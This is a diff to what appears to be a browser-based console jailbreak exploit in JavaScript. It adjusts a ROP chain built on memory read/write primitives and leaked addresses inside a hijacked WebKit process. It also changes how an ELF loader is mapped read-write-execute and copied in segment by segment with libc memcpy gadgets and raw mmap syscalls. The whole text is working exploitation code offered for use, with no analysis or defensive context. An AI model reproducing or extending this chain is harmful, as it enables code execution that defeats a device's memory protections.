@@ -1162,6 +1162,11 @@ async function initROP() {
     let ropWorkerStack = null;
     let ropReturnSlot = null;
 
+    // The ROP stage is the first thing that allocates after the exploit has
+    // filled the WebProcess, so its own footprint matters. The default stack
+    // is 0x80000 (512 KB) plus a 512 KB zeroed scratch array -- 1.3 MB for a
+    // chain that is barely 500 bytes long. Size it to what we actually use.
+    log("ROP: building the chain (small stack, ~130 KB)...", "log-info");
     let chain = new worker_rop({
         write8: p.write8, write4: p.write4, write2: p.write2, write1: p.write1,
         read8: p.read8, read4: p.read4, read2: p.read2, read1: p.read1,
@@ -1296,7 +1301,7 @@ async function initROP() {
         // (NB: the carrier's own assertHome() is useless here; mem.js calls
         // releaseFakeCell(), so it is false by design.)
         selfTest("post-chain");
-    }});
+    }}, 0x20000, 0x4000);
 
     exploitState.chain = chain;
     return { p, chain, gadgets, syscalls, malloc, array_from_address, nogc, selfTest, libSceNKWebKitBase, libSceLibcInternalBase, libKernelBase, libcMemcpy: libSceLibcInternalBase.add32(offsets.lc_memcpy) };
@@ -1390,14 +1395,18 @@ async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy, selfTest
         throw new Error(`mmap returned a non-canonical address: 0x${mapped.toString()}`);
     log(`elfldr mapped RWX at 0x${mapped.toString()}`, "log-ok");
 
-    // ---- 3. stage the image and copy it in with one memcpy ------------------
+    // ---- 3. copy the segments in with one memcpy each ------------------------
     // A per-byte primitive loop would be ~400k carrier round trips; memcpy runs
-    // on the hijacked thread and is instant.
-    const staging = new Uint8Array(imageSize);
-    for (const s of segments) staging.set(elfData.subarray(s.off, s.off + s.filesz), s.vaddr);
-    nogc.push(staging);
-    const stagingPtr = p.read8(p.leakval(staging).add32(0x10));
-    log(`staging ${imageSize} byte image at 0x${stagingPtr.toString()}`, "log-info");
+    // on the hijacked thread and is instant. There is deliberately NO staging
+    // buffer: the ELF bytes are already a contiguous native allocation, so
+    // each PT_LOAD is copied straight from the file. That removes a 384 KB
+    // allocation from a WebProcess that is already at its limit.
+    const srcPtr = p.read8(p.leakval(elfData).add32(0x10));
+    // Prove srcPtr really points at our bytes before trusting it as a source.
+    if ((p.read4(srcPtr) >>> 0) !== (dv.getUint32(0, true) >>> 0)) {
+        throw new Error("elfldr: leakval(elfData) does not point at the file");
+    }
+    log(`elf source at 0x${srcPtr.toString()} (no staging buffer)`, "log-info");
 
     const expectDword = (off) =>
         (elfData[off] | (elfData[off + 1] << 8) | (elfData[off + 2] << 16)
@@ -1414,9 +1423,15 @@ async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy, selfTest
         }
         return { bad, firstBad };
     }
+    const copyIn = async (dst) => {
+        for (const s of segments) {
+            chain.fcall(libcMemcpy, dst.add32(s.vaddr), srcPtr.add32(s.off), s.filesz);
+            await chain.run();
+        }
+    };
 
-    chain.fcall(libcMemcpy, mapped, stagingPtr, imageSize);
-    await chain.run();
+    log("ROP: copying PT_LOAD segments...", "log-info");
+    await copyIn(mapped);
 
     let v = verifyWrite(mapped);
     if (v.bad !== 0) {
@@ -1429,8 +1444,7 @@ async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy, selfTest
         const wAddr = await chain.syscall(SYS_MMAP, 0, imageSize, PROT_RW, MAP_SHARED, wFd, 0);
         if ((wAddr.low >>> 0) === 0xFFFFFFFF && (wAddr.hi >>> 0) === 0xFFFFFFFF)
             throw new Error("mmap of the jitshm alias returned -1");
-        chain.fcall(libcMemcpy, wAddr, stagingPtr, imageSize);
-        await chain.run();
+        await copyIn(wAddr);
         v = verifyWrite(wAddr);
         if (v.bad !== 0)
             throw new Error(`elfldr image did not land: ${v.bad} bad dwords, first at `
